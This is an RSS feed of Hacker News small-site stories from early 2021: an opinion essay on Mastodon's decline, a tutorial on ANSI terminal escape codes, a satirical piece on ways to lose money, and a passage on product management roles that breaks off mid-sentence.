<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 5]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 5. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Thu, 04 Feb 2021 16:55:06 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-5.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Thu, 04 Feb 2021 16:55:06 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[Mastodon is crumbling – and it will only get worse]]>
            </title>
            <description>
<![CDATA[
Score 30 | Comments 29 (<a href="https://news.ycombinator.com/item?id=26011818">thread link</a>) | @todsacerdoti
<br/>
February 3, 2021 | https://sporks.space/2021/02/02/mastodon-really-is-crumbling-and-it-will-only-get-worse/ | <a href="https://web.archive.org/web/*/https://sporks.space/2021/02/02/mastodon-really-is-crumbling-and-it-will-only-get-worse/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-297">
	<!-- .entry-header -->

	
		<div>
			
<p>I am 100% serious with the title, despite the appearance of click-bait. Mastodon has a serious structural rot that is only worsening as time gets on. I think this is for a few reasons which I will outline below.</p>



<p>Ironically, I don’t feel safe posting this directly to the fediverse because of the very forces I’m about to describe. I’m not worried about the cancel crew, I just don’t want to deal with hostile interactions right now. I might link to this post but it’s less likely to get hate mail I suspect if I do it that way rather than write this all up in a giant thread on fedi.</p>



<p>What I am presenting is largely anecdotal opinion, although it has been gathered from countless others (I’m not going to name any names, they deserve better than harassment or people trying to change their views and in the process merely reinforcing them).</p>



<h2>Background on myself</h2>



<p>I’ve been on Mastodon since April 2017. I was on “fedi” (well, the ostatus fediverse) before that, on long-gone instances I forgot the name of. I was on Mastodon in the very early days of its development, when content warnings were brand new, blocking/silencing was seriously broken, and fedi was just getting exciting due to press coverage. Before this, I was on IRC since 2005 and an IRC operator on a small network (it’s not glamorous, trust me).</p>



<h2>The problem</h2>



<p>Fedi has a problem as the title says: it’s crumbling. It’s a lot less vibrant than when I joined up, even back when GNUSocial roamed the earth (it was a pile of shit trying to imitate Twitter and mostly filled with people banned from Twitter for GamerGate and going too far, even for Twitter’s lax standards of the day).</p>



<p>It actually baffles me why so much of the Mastodon userbase can be traced back to the Tumblr/Twitter leftist crowd, when Fedi’s beginnings were on a network largely consisting of ultra-right people thrown off Twitter. I can only speculate, but I suspect the main reasons are they believed they would be safer (which is a joke), and many themselves (or their friends at least) were banned from those platforms for similarly shitty behaviour.</p>



<p>But it’s a mistake to believe that Fedi is safer at all. In fact, in many ways, it’s worse.</p>



<h3>Fedi is the least safe place around</h3>



<p>The thing about Fedi is that due to its nature, it has a low bar to entry. Anyone can make an instance at any time for not a whole lot of money. There are tons of far-right instances littering the place, and few admins can truly keep up (the worst-kept secret amongst Mastodon admins I would say). Most of the userbase just blocks them on an ad-hoc basis and moves on (or doesn’t notice them), but the fact that the Nazis haven’t really taken over the place is only by their mere incompetence.</p>



<p>To illustrate the problem, I will tell you about this: the largest instance on the Fediverse.</p>



<p>Oh, no, not mastodon.social. They’re big, but not as big as the largest. The largest is Pawoo, with around a million users last I checked. It’s owned by Pixiv, a Japanese company (think Japanese DeviantArt). And if Fedi knew even a rudimentary level of Japanese (this would require widespread non-Western cultural awareness they do not possess), they wouldn’t have joined in the first place. Japanese nationalism is everywhere on Pawoo, and the admins largely don’t care (granted: I don’t pay much attention to it and filtered it a long time ago, this may not be the case any longer). There is a certain irony I love about the largest Fedi instance being a commercial entity, despite the English speakers of the Fediverse largely eschewing corporations and brands. They also allow loli and (fictional) artwork of children, which is not banned in Japan but is a grey area in the US as advised by legal counsel for IF (I personally don’t want to test it, if you want to, have fun, leave me out of it).</p>



<p>Pawoo mostly sits there, under the radar, because they don’t speak English, and many instances blocked them a long time ago (I remember the great Pawoo discourse of 2017). There are tons and tons of other instances that most people don’t even know about that spew things that are far worse.  We at mst3k actually have <a href="https://mst3k.interlinked.me/about/more" target="_blank" rel="noreferrer noopener">a pretty big list</a>, and it ain’t even close to how many are actually out there. I just block them as I see them. Granted, many of those instances are long-gone, but there are many more to replace them.</p>



<h3>The faux-woke crowd is making fedi less safe</h3>



<p>I know this one is going to get me flamed and called racist or whatever the fuck, but so be it.</p>



<p>Now, full disclosure: I am partially Romani, Native American, but mostly (and certainly culturally raised) white, but <a href="https://weirder.earth/@WeirderAdmin/105640549522292568" target="_blank" rel="noreferrer noopener">I’ve listened to what other PoC have to say on this matter.</a></p>



<p>Fedi has a really bad problem: race-based trolling. There is a huge contingent on Fedi that is taking advantage of white guilt to troll the ever-loving fuck out of people.</p>



<p>I know this sounds like an amusing thing and is very much a “so what, they’re white” moment.  But I assure you, it’s anything but funny, and it’s causing minorities to be shed from Fedi.</p>



<p>Let me give a specific example: in mid-2020, a Jewish non-binary person was harassed by a member of one of the instances that host many of these trolls. People were still reluctant to do the right thing and block the instance, because they didn’t want to be called racist. The thing is, you can be a minority and still be a fucking dickhead, and you can also still be racist (without even realising it!) and act in bigoted ways against other minorities (go look up the Cherokee freedmen controversy for a really, really, really bad look into how far this can go). But nothing about your skin colour or ethnicity says “I can troll whoever I want.” Anyone who tells you otherwise is a troll and you should block and report them. If their admin won’t do anything, remove them.</p>



<p>The thing is, these kinds of games cheapen real racial justice. These people are less interested in racial justice for all and more interested in getting a rise out of people. And people are too afraid to stand up to it. This is a cancer silently driving people back to Twitter. I don’t think it’s the only thing stacked against Fedi, but it’s a huge one.</p>



<h3>The cancel crowd</h3>



<p>I’m going to say it: the canceldon crowd are obnoxious. They’re a holdover from Twitter and Tumblr. I won’t go into the whole “why cancelling is a waste of time” thing, but suffice it to say: cancelling doesn’t really fucking work, and it’s just a nice way of saying “doing what 4chan does to people it hates, but poorly.” Which is to say, harassment and trolling people. And of course people think it’s okay, even when they fuck up and sometimes cancel the wrong person or have bad info or got led on (this is never discussed, of course, and there is never an apology).</p>



<p>These people are literally making Fedi inherently less safe for everyone, and are no better than the crowd that used to be on Fedi (and still are to an extent) before Gargron decided to co-opt the Fediverse for his own gain.</p>



<h3>The people who write the software are fucking dickheads</h3>



<p>I’m going to be honest with you: Gargron (the guy who makes Mastodon) is an asshole. His reputation precedes him, so I won’t go into detail. However, I found out from a former IRL friend of mine (who will remain nameless) that he once asked her if he could continue to refer to her by her dead name. Said friend referred to Gargron as a “shitty liberal,” and I do not mean in the US sense.</p>



<p>The people at Pleroma are not much better. I mean, Alex Gleeson, enough said.</p>



<p>The only two relevant pieces of Fedi software are Pleroma and Mastodon. ActivityPub is such a horrible protocol, and Mastodon has butchered it so much, it’s impossible to make an interoperable implementation without man-months of work. To reimplement Mastodon from the ground up would be a nightmare. And forking Mastodon sounds great, but you’re up against a huge pile of technical debt. You could fork Pleroma, but then you’d have to know Elixir (a language few people know).</p>



<p>Also, the last time a major fork happened in Mastodon (aside from Glitch), it was mostly a group of non-developers who hoped they could cult their way into a dev team. It didn’t work.</p>



<p>I wanted to fix this problem but I decided it wasn’t worth it, and you’d have to be up against a community who is watching your every mistake and will find a reason to pillory you if you fuck up.</p>



<h3>“Mastodon” never developed a culture of its own</h3>



<p>You know, if you leave a container of yoghurt out for 4 years, it develops a culture. That’s more than can be said for the Mastodon part of Fedi, which has never outgrown being an offshoot of Twitter and Tumblr.</p>



<p>This is to its detriment, as it’s not a compelling place on the surface. People come in waves, and most leave again when Twitter and Tumblr rights its wrongs. I’ve seen this happen multiple times.</p>



<p>Mastodon users would do well to stop treating Fedi as Twitter, but of course, Mastodon and Pleroma as platforms basically both treat Fedi as Twitter expanded universe. It’s no coincidence <a href="https://techcrunch.com/2021/01/15/twitters-vision-of-decentralization-could-also-be-the-far-rights-internet-endgame/" target="_blank" rel="noreferrer noopener">Gargron has joined Twitter’s federation initative.</a> I have no hopes Fedi will develop a meaningful distinct culture before its too late.</p>



<h3>The tools to protect users are rotten fruit in an opaque bag</h3>



<p><em>Note: this was edited in after the fact. I meant to include it in the original.</em></p>



<p>I’m going to say what many admins lack the bravery or vision to say: the tools to protect the users of Mastodon are inadequate. Pleroma got this better, but many Mastodon users cancel any Pleroma user on sight (as I explain below).</p>



<p>The filtering sucks (it displays “filtered” unless you choose to permanently delete any posts containing a keyword). The default guide for setting up ElasticSearch (the thing that enables search) had (may still have for all I know) no mention of using a firewall or listening only on localhost (Gargron pushed back on requests to mention this), which would enable anyone in theory to connect to …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://sporks.space/2021/02/02/mastodon-really-is-crumbling-and-it-will-only-get-worse/">https://sporks.space/2021/02/02/mastodon-really-is-crumbling-and-it-will-only-get-worse/</a></em></p>]]>
            </description>
            <link>https://sporks.space/2021/02/02/mastodon-really-is-crumbling-and-it-will-only-get-worse/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26011818</guid>
            <pubDate>Wed, 03 Feb 2021 08:47:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Everything you never wanted to know about ANSI escape codes]]>
            </title>
            <description>
<![CDATA[
Score 40 | Comments 11 (<a href="https://news.ycombinator.com/item?id=26011198">thread link</a>) | @brendanfalk
<br/>
February 2, 2021 | https://notes.burke.libbey.me/ansi-escape-codes/ | <a href="https://web.archive.org/web/*/https://notes.burke.libbey.me/ansi-escape-codes/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
<header>

<p>2019-02-13</p>
</header>
<p><strong>See also: <a href="https://ankiweb.net/shared/info/1616925913">Flash cards (Anki deck) for memorization</a></strong></p>
<p>My team writes a lot of command line tools, and we like to assume that people aren’t using a literal <a href="https://en.wikipedia.org/wiki/VT100">VT100</a> (meaning: we liberally use colours, italics, and basically every other terminal feature available to us). This tends to result in strings in our code that look a little like this:</p>
<pre><code>"\x1b[A\r\x1b[K\x1b[1;32mopened \x1b[1;4;34m%s\x1b[0;1;32m in your browser.\x1b[0m\n"</code></pre>
<p>If you’re like most people, your face just melted, but it’s actually really simple. This page is a crash course in what all of these things mean, and how to learn to read and write them effectively.</p>
<h3 id="x1b"><code>\x1b</code></h3>
<p>ANSI escapes always start with <code>\x1b</code>, or <code>\e</code>, or <code>\033</code>. These are all the same thing: they’re just various ways of inserting the byte 27 into a string. If you look at an <a href="http://www.asciitable.com/">ASCII table</a>, <code>0x1b</code> is literally called <code>ESC</code>, and this is basically why.</p>
<h3 id="control-sequences">Control sequences</h3>
<p>The majority of these escape codes start with <code>\x1b[</code>. This pair of bytes is referred to as <code>CSI</code>, or “Control Sequence Introducer”. By and large, a control sequence looks like:</p>
<pre><code>0x1B + "[" + &lt;zero or more numbers, separated by ";"&gt; + &lt;a letter&gt;</code></pre>
<p>It’s helpful to think of it this way: the terminating letter is a function name, and the intervening numbers as function arguments, delimited by semicolons rather than the typical commas.</p>
<p>If you see <code>\x1b[0;1;34m</code>, you can read it like this:</p>
<pre><code>\x1b[  # call a function
0;1;34 # function arguments (0, 1, 34)
m      # function name</code></pre>
<p>In effect, this is <code>m(0, 1, 34)</code>. Similarly, <code>\x1b[A</code> is just <code>A()</code>.</p>
<h3 id="available-functions">Available functions</h3>
<p>So with that mental model—reading escape sequences as function invocations—here’s an abridged documentation of the “standard library”, as it were:</p>
<table>
<colgroup>
<col>
<col>
<col>
<col>
</colgroup>
<thead>
<tr>
<th></th>
<th>name</th>
<th>signature</th>
<th>description&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</th>
</tr>
</thead>
<tbody>
<tr>
<td>A</td>
<td>Cursor Up</td>
<td>(n=1)</td>
<td>Move cursor up by <code>n</code></td>
</tr>
<tr>
<td>B</td>
<td>Cursor Down</td>
<td>(n=1)</td>
<td>Move cursor down by <code>n</code></td>
</tr>
<tr>
<td>C</td>
<td>Cursor Forward</td>
<td>(n=1)</td>
<td>Move cursor forward by <code>n</code></td>
</tr>
<tr>
<td>D</td>
<td>Cursor Back</td>
<td>(n=1)</td>
<td>Move cursor back by <code>n</code></td>
</tr>
<tr>
<td>E</td>
<td>Cursor Next Line</td>
<td>(n=1)</td>
<td>Move cursor to the beginning of the line <code>n</code> lines down</td>
</tr>
<tr>
<td>F</td>
<td>Cursor Previous Line</td>
<td>(n=1)</td>
<td>Move cursor to the beginning of the line <code>n</code> lines up</td>
</tr>
<tr>
<td>G</td>
<td>Cursor Horizontal Absolute</td>
<td>(n=1)</td>
<td>Move cursor to the the column <code>n</code> within the current row</td>
</tr>
<tr>
<td>H</td>
<td>Cursor Position</td>
<td>(n=1, m=1)</td>
<td>Move cursor to row <code>n</code>, column <code>m</code>, counting from the top left corner</td>
</tr>
<tr>
<td>J</td>
<td>Erase in Display</td>
<td>(n=0)</td>
<td>Clear part of the screen. 0, 1, 2, and 3 have various specific functions</td>
</tr>
<tr>
<td>K</td>
<td>Erase in Line</td>
<td>(n=0)</td>
<td>Clear part of the line. 0, 1, and 2 have various specific functions</td>
</tr>
<tr>
<td>S</td>
<td>Scroll Up</td>
<td>(n=1)</td>
<td>Scroll window up by <code>n</code> lines</td>
</tr>
<tr>
<td>T</td>
<td>Scroll Down</td>
<td>(n=1)</td>
<td>Scroll window down by <code>n</code> lines</td>
</tr>
<tr>
<td>s</td>
<td>Save Cursor Position</td>
<td>()</td>
<td>Save current cursor position for use with <code>u</code></td>
</tr>
<tr>
<td>u</td>
<td>Restore Cursor Position</td>
<td>()</td>
<td>Set cursor back to position last saved by <code>s</code></td>
</tr>
<tr>
<td>f</td>
<td>…</td>
<td>…</td>
<td>(same as G)</td>
</tr>
<tr>
<td>m</td>
<td>SGR</td>
<td>(*)</td>
<td>Set graphics mode. More below</td>
</tr>
</tbody>
</table>
<p>For practice, you might try interpreting the following string:</p>
<pre><code>\x1b[3A\x1b[4D\x1b[shello\x1b[J\x1b[1;3Hworld\x1b[u\x1b[13T</code></pre>
<h3 id="sgr">SGR</h3>
<p>The SGR (“Select Graphics Rendition”) function (<code>m</code>) has a much more complex signature than the other functions. An—again, abridged—guide to SGR arguments:</p>
<table>
<colgroup>
<col>
<col>
</colgroup>
<thead>
<tr>
<th>value</th>
<th>name&nbsp;/&nbsp;description&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>Reset: turn off all attributes</td>
</tr>
<tr>
<td>1</td>
<td>Bold (or bright, it’s up to the terminal and the user config to some extent)</td>
</tr>
<tr>
<td>3</td>
<td>Italic</td>
</tr>
<tr>
<td>4</td>
<td>Underline</td>
</tr>
<tr>
<td>30–37</td>
<td>Set text colour from the basic colour palette of 0–7</td>
</tr>
<tr>
<td>38;5;<em>n</em></td>
<td>Set text colour to index <code>n</code> in a <a href="https://commons.wikimedia.org/wiki/File:Xterm_256color_chart.svg">256-colour palette</a> (e.g.&nbsp;<code>\x1b[38;5;34m</code>)</td>
</tr>
<tr>
<td>38;2;<em>r</em>;<em>g</em>;<em>b</em></td>
<td>Set text colour to an RGB value (e.g.&nbsp;<code>\x1b[38;2;255;255;0m</code>)</td>
</tr>
<tr>
<td>40–47</td>
<td>Set background colour</td>
</tr>
<tr>
<td>48;5;<em>n</em></td>
<td>Set background colour to index <code>n</code> in a 256-colour palette</td>
</tr>
<tr>
<td>48;2;<em>r</em>;<em>g</em>;<em>b</em></td>
<td>Set background colour to an RGB value</td>
</tr>
<tr>
<td>90–97</td>
<td>Set text colour from the <strong>bright</strong> colour palette of 0–7</td>
</tr>
<tr>
<td>100–107</td>
<td>Set background colour from the <strong>bright</strong> colour palette of 0–7</td>
</tr>
</tbody>
</table>
<p>Multiple SGR arguments can always be concatenated using another <code>;</code>, and they will be applied in the order they are encountered. It’s especially common to see <code>0;</code> before some other argument, in order to reset the state before applying our own.</p>
<h3 id="colour-palettes">Colour Palettes</h3>
<p>The basic colour palette has 8 entries:</p>
<ul>
<li>0: black</li>
<li>1: red</li>
<li>2: green</li>
<li>3: yellow</li>
<li>4: blue</li>
<li>5: magenta</li>
<li>6: cyan</li>
<li>7: white</li>
</ul>
<p>A useful way to help remember this, or at least to select colours for use, is that, with the exception of 0/black, the colours are ordered by usefulness, with highest first: red text is very useful for indicating failures, green is useful for indicating extreme success, yellow for warnings, and then blue, magenta, and cyan for progressively more obscure conditions or decoration.</p>
<p>0 and 7 are less useful for text because one or the other will generally look nearly-unreadable depending on whether the user has a light or a dark background.</p>
<p>Terminals will also have a “bright” version of this palette (activated using 90–97 / 100–107). These are the same (black/red/green/etc.) but generally noticeably brighter than their regular counterparts.</p>
<p>For practice, you might try to figure out how this string would display:</p>
<pre><code>\x1b[38;2;255;255;0mH\x1b[0;1;3;35me\x1b[95ml\x1b[42ml\x1b[0;41mo\x1b[0m</code></pre>
<h3 id="miscellany">Miscellany</h3>
<p>Another pair of useful escapes is <code>\x1b[?25h</code> and <code>\x1b[?25l</code>. These show and hide the cursor, respectively. Try not to think too hard about the syntax here: <code>?25</code> means something to do with the cursor and <code>h</code> and <code>l</code> stand for “high” and “low”: imagine a bit indicating whether the cursor should be visible. The “high” value (1) would indicate “show”; the “low” value (0) would indicate “hide”.</p>
<p>Show/hide is useful when you’re going to draw some stuff that’ll cause the cursor to jump around like crazy, for example, repainting a couple of the last few lines to update them with new content.</p>
<p>One other thing that we use frequently is <code>\r</code>, or Carriage Return, which is functionally similar or identical to <code>\x1b[1G</code>. It just moves the cursor to the start of the line.</p>
<h3 id="summary">Summary</h3>
<p>That was a lot of information, but that’s essentially everything you need to know in order to competently read and write ANSI escape codes in a terminal.</p>
<p>If you want to learn this more thoroughly, <a href="https://ankiweb.net/shared/info/1616925913">I’ve put together a set of flash cards to help</a>.</p>



</div>]]>
            </description>
            <link>https://notes.burke.libbey.me/ansi-escape-codes/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26011198</guid>
            <pubDate>Wed, 03 Feb 2021 06:41:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Lose Money]]>
            </title>
            <description>
<![CDATA[
Score 127 | Comments 45 (<a href="https://news.ycombinator.com/item?id=26010977">thread link</a>) | @maverik
<br/>
February 2, 2021 | https://www.getrevue.co/profile/andrewtye/issues/how-to-lose-money-323332 | <a href="https://web.archive.org/web/*/https://www.getrevue.co/profile/andrewtye/issues/how-to-lose-money-323332">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><!--[if mso | IE]>
<table role="presentation" border="0" cellpadding="0" cellspacing="0"><tr><td style="vertical-align:top;width:600px;">
<![endif]--><div aria-labelledby="mj-column-per-100"><div><div>
      <p><strong>1. Trade Options</strong></p><p><em>Fastest</em></p><p>No doubt you have heard all about how easy it is for people to lose their life savings trading securities in the stock market. But there is actually a much faster way – options. I’m not going to get into the nuts and bolts of trading options (actually, most people who lose money with options don’t understand how they work anyway) but I will give you a quick definition and then show how efficient these instruments-of-wealth-destruction really are.&nbsp;</p><p>There are two types of options – calls and puts. If you buy a call option, you are purchasing the right to but the underlying stock at a specified price. So, you might pay $3,000 dollars for the right to buy 100 shares Microsoft stock at $200 per share. Then, if the stock goes up to $300 you can either buy 100 shares at $200, or you can sell the option to some other idiot and they can use it to buy the shares. But, as you might imagine, that options contract is worth a lot more than $3,000 now, and you can sell it for a premium. This is how leverage works to make money. But we’re concerned about how to use leverage to lose money.&nbsp;</p><p>The nice thing about options is that there isn’t just one way to lose money. No, you can lose money in many different ways – far more than I can write on this page. But, if you’re looking to lose money don’t bother to read up on the different ways to trade options. Just go for it, and I’m certain you will lose everything. I’ll give you a few real-life examples of how I’ve lost money in options. First, buy options that are about ready to expire. In the previous example, if you bought the Microsoft options for $3,000, but the stock went to $195 instead of $300, you could lose all your money. Another easy way to lose money with options is to buy contracts that are way out of the money (OTM). This simply means you might buy Microsoft options that give you the right to buy stock at $200 – except this time, the stock is at $150 per share. If you do this, you won’t find anyone willing to buy the option contract back from you (after all, why would someone pay for the right to buy stock at $200 if it’s already at $150). And if you can’t find anyone to buy the contract from you it will expire worthless and you’ll lose all your money. Another favorite is not cutting your losses. If your contract is losing money (this often happens if you think the stock is going to go up but it goes down) and you want to lose more money, just hold it and don’t sell. Options decay with time so the longer you hold it the more likely it is that you will lose all your money. So, simply hold your position when it starts to go south and you’ll lose way more money.</p><p>Pro tip – Make sure to buy a bunch of contracts (say 10 of them) so you lose $30,000 instead of $3,000.</p><p>I could go on but I think you get the point. I have personally lost thousands of dollars using these methods and would highly recommend them to anyone looking for a fast way to lose it all. I’d recommend you try losing a small amount in stocks first to get your feet wet – then dive into options. If you’re anxious to give it a go, <a href="https://cash.app/app/TDZWWPC?utm_campaign=UA-188825179-1&amp;utm_medium=email&amp;utm_source=Revue%20newsletter" target="_blank">use this link to start trading with Cash App</a> and you’ll get free money to lose right away.</p><p>The only options trader who doesn’t lose money is the one who never starts.</p><p><em>- Andrew Tye</em></p><p><strong>2. Write a Book</strong></p><p><em>Most consistent</em></p><p>You might think writing a book is a great way to make a bunch of cash – and you’d be wrong. In spite of the many books that will tell you how to make money writing a book, I’m here to let you in on a secret –writing a book is actually a fantastic way to lose money. I’ve written four short books and they have literally grossed hundreds of dollars. Now – hearing that I’ve sold some books might make you think you should write one also. But it’s a trap – you will spend hundreds of hours writing a book and then make hundreds of dollars in return. Not sure about you, but if I’m working for $1/hour I’m losing money fast. My latest book probably has more pages than it has copies sold – <a href="https://gum.co/getajob?utm_campaign=UA-188825179-1&amp;utm_medium=email&amp;utm_source=Revue%20newsletter" target="_blank">take a look here</a> if you want a quick reference on how to get a job.</p><p><strong>3. Teach Online Courses</strong></p><p><em>Most helpful</em>&nbsp;</p><p>Aw, I love this one. You can help other people learn a skill and lose your money at the same time. Win-lose. Some folks think they can make a great online course and it will make them a nice living or side income. Most of those nice people are wrong. News flash – more people lose money creating online courses than make money from them. The good news for you is that there really aren’t many barriers to entry here. Get yourself a cheap mic (who needs quality audio anyway) and an inexpensive webcam. And go to town without bothering to make an outline. I’ve found a couple approaches that both work well. Option A - read the script from a piece of paper. Option B – don’t plan at all and just wing the recording.&nbsp;</p><p>This is a strategy that I’ve already proven out for you. I created a few classes online and over the past 5 years they have actually generated thousands of dollars. But net returns are certainly negative because for those thousands of dollars I spent hundreds of hours creating content, answering questions, and buying likes. If you’d like a good idea of what to expect, I have over 40,000 students taking my online courses and they have generated a few thousand in gross revenues.</p><p>Pro tip – make your courses free from the start – you will recoup less of your investment this way, and end up losing quite a bit more overall.</p><p><strong>4. Get a Degree</strong></p><p><em>Most socially acceptable</em></p><p>This tactic is harder to lose money with, but when you lose you lose big. Books and courses are more consistent losers, but they don’t add up as fast as big tuition debt combined with time off work. As mentioned, you do have to be careful with this one because it is possible to get a degree and actually make money. But here is what you do to ensure loss. First, choose a degree that you aren’t passionate about, or that doesn’t have high paying jobs, or that doesn’t really have any jobs (<a href="https://lunarjobs.co/radar?utm_campaign=UA-188825179-1&amp;utm_medium=email&amp;utm_source=Revue%20newsletter" target="_blank">research here</a>). Second, don’t get a side job during school and take all of the student loans you can get your hands on. Third, be very picky about which of the few jobs you take and only take ones that are in fact low paying (high cost of living is also preferred when choosing location). </p><p>Pro tip – fail a few classes to extend your time to graduation – that way you can take on more debt.&nbsp;</p><p>One thing to watch out for is accidentally choosing a degree that can actually make you money. Like engineering or computer science. But even this caution is less important now than when I went to college because places like Lambda School are making four year university degrees more certain losers. I’ve been on both sides of this one. I spent two years studying software development and about 4 years studying engineering. Both of those degrees were inexpensive, I worked part-time while studying, and have made money with both of them. But, thankfully I learned my lesson and managed to lose a lot of money by the time I got an MBA. I could have started a company with the money, or just worked my way up in an engineering role. But by taking on a bunch of debt and forgoing a salary for a couple years I was able to lose way more money than if I’d simply started a company. I think I actually lost more by going to business school than if I’d started a company and lost all of the investors’ money!</p><p><strong>5. Become an Inventor</strong></p><p><em>Most fun</em></p><p>Okay people, this has to be one of the most enjoyable ways to lose money! I have drummed up all sorts of new inventions. Of course, they don’t make any money but that’s sort of the point right! Most of my awesome inventions failed make money because someone else took them to market before me. Other times it was because they were so stupid nobody wanted to buy them (or even look at them actually).</p><p>I’ve invented lots of awesome products that lost money, but here is one of my favorite no-hits:</p><p><em>Barking Bulb</em>: Scare away intruders with a bark</p><p>Don’t want a dog in your backyard? Fine, get a bulb that barks when intruders are detected. Light, motion sensing and sound in one bulb. I thought this was so brilliant. Safe as having a guard dog, but you don’t have to clean up after it. Literally the best of both worlds. Coming soon to a Home Depot near you!&nbsp;</p><p>Pro tip: Go straight for all of the full, non-provisional patents you can before you know if anyone wants the idea. Don’t wait to see if it’s manufacturable. Don’t do market research to see if competitive products exist. Just talk to an attorney and get the patents drawn up. This shortcut will let you lose $20,000 to $40,000 upfront before you even start doing hardcore R&amp;D or go to production.</p><p><strong>6. Do Internet Advertising </strong></p><p><em>Most controversial&nbsp;</em></p><p>Another interesting way to lose money is with online advertising. What I like most about this one is you can lose money consistently and sound smart to your friends at the same time. Where do you spend your money they ask? Oh, I have a website with ads. Wow. That is so cool. What you do is setup a website with some content (e.g. a blog about how to lose money) and you put some ads (from Google AdSense or affiliates) on it that will generate money for you. Then, to get more people to your blog you also buy ads from Google Ads or Facebook. If you do it just right there is arbitrage here – for every dollar you spend buying ads to get traffic to your site you can get 70 cents of income from the ads on your blog. You can consistently lose $0.30 for every $1.00 you spend. The downside is nearly unlimited as long as you pick a topic that has significant search traffic.</p><p>This one is somewhat controversial because a lot of people think that putting ads on your site and then buying other ads to get more traffic is actually a good way to make money. I’ve proven that it’s much easier to lose money with this method than it is to make money. So you can ignore the doubters.</p><p><strong>7. Stop finishing Projects</strong></p><p><em>Biggest loss</em></p><p>I have completely mastered this one. It has a sweet combination of money lost from working for …</p></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.getrevue.co/profile/andrewtye/issues/how-to-lose-money-323332">https://www.getrevue.co/profile/andrewtye/issues/how-to-lose-money-323332</a></em></p>]]>
            </description>
            <link>https://www.getrevue.co/profile/andrewtye/issues/how-to-lose-money-323332</link>
            <guid isPermaLink="false">hacker-news-small-sites-26010977</guid>
            <pubDate>Wed, 03 Feb 2021 05:53:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Product Manager vs. Product Marketing Manager vs. Product Owner]]>
            </title>
            <description>
<![CDATA[
Score 64 | Comments 35 (<a href="https://news.ycombinator.com/item?id=26010927">thread link</a>) | @DamilolaA
<br/>
February 2, 2021 | https://www.damilolaa.xyz/Product-Manager-vs-Product-Marketing-Manager-vs-Product-Owner | <a href="https://web.archive.org/web/*/https://www.damilolaa.xyz/Product-Manager-vs-Product-Marketing-Manager-vs-Product-Owner">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div><p>This is a question that often arises in the product world and it requires our time to unpack it. Though these roles are somewhat similar and they work towards achieving the same set of goals, we then ought to look at the clear line distinction in the line of duty of the individuals and performance metric used to evaluate the success achieved by each role to help us understand them better and also help you figure out the most suitable for you.</p><p>These roles vary from company to company as in the case of a startup, a product manager is often tasked with the duty of these 3 roles while in larger or enterprise companies, there are 3 or more different roles in the product team working at different capacities to ensure that the right product is shipped and meet the demands of users.</p><p>While the product manager’s role is one that has come to limelight, the product marketing manager and product owner role have also been adopted by a lot of companies depending on their product and company culture. In this article, we will explain the difference between these roles and the job requirement of the individual involved.</p><h3 id="the-product-manager">The Product Manager</h3><p>These individuals are often referred to as mini CEOs of a product. They conduct customer surveys to figure out the customer’s pain and build solutions to address it. The PM also prioritizes what features are to be built next and prepares and manages a cohesive and digital product roadmap and strategy.</p><h3 id="the-product-marketing-manager">The Product Marketing Manager</h3><p>The PMM communicates vital product value — the “why”, “what” and “when” of a product to intending buyers. He manages the go-to-market strategy/roadmap and also oversees the pricing model of the product. The primary goal of a PMM is to create demand for the products through effective messaging and marketing programs so that the product has a shorter sales cycle and higher revenue.</p><h3 id="the-product-owner">The Product Owner</h3><p>This role exists in a scrum environment — <em><a href="https://www.scrum.org/resources/what-is-scrum" title="Scrum" target="_blank" rel="noreferrer">Scrum</a> is a framework for project management that emphasizes teamwork, accountability, and iterative progress toward a well-defined 